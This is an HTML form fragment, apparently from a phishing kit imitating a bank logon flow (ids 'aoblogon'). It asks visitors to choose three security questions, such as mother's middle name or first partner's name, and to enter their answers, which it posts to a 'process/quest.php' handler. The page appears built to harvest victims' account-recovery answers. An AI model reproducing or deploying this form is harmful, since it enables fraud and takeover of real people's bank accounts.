...
<form method="post" id="aoblogon" name="aoblogon" action="./process/quest.php">
<div><div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
<label class="control-label" for="aoblogon_userid">Question 1</label>
<div>
		<p>
		<select name="q1" class="kds-form__label" style="border-left: 1px solid thistle; margin-bottom: 10px; border-top: 1px solid thistle;" required>
            ...
            <option value="What’s your brother/sisters nickname?">What’s your brother/sisters nickname?</option>
...
<input class="form-control inputbox required" type="text" id="aoblogon_userid" name="ans1" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus"></div></div>

<div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
<label class="control-label" for="aoblogon_userid">Question 2</label>
<div>
		<p>
		<select name="q2" class="kds-form__label" style="border-left: 1px solid thistle; margin-bottom: 10px; border-top: 1px solid thistle;" required>
            <option selected="selected" value="">Choose Your Question</option>
            <option value="What is your maternal grandmother's first name?"</option>
            ...
            <option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?</option>
            <option value="what is your mother's middle name?">what is your mother's middle name?</option>
            <option value="What’s your Favourite teachers name?">What’s your Favourite teachers name?</option>
            <option value="What’s your brother/sisters nickname?">What’s your brother/sisters nickname?</option>
            <option value="What’s your favorite board game?">What’s your favorite board game?</option>
...
<div class="controls">
	<input class="form-control inputbox required" type="text" id="aoblogon_userid" name="ans2" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus"></div>
</div>

<div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
<label class="control-label" for="aoblogon_userid">Question 3</label>
<div>
		<p>
		<select name="q3" class="kds-form__label" style="border-left: 1px solid thistle; margin-bottom: 10px; border-top: 1px solid thistle;" required>
            <option selected="selected" value="">Choose Your Question</option>
...
<div class="controls">
	<input class="form-control inputbox required" type="text" id="aoblogon_userid" name="ans3" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus"></div>
</div>
...
<div class="controls">
<input class="btn btn-primary btn-arrow btn-lg" type="submit" name="submit" value="Submit" id="aoblogon_submit"></div></div>
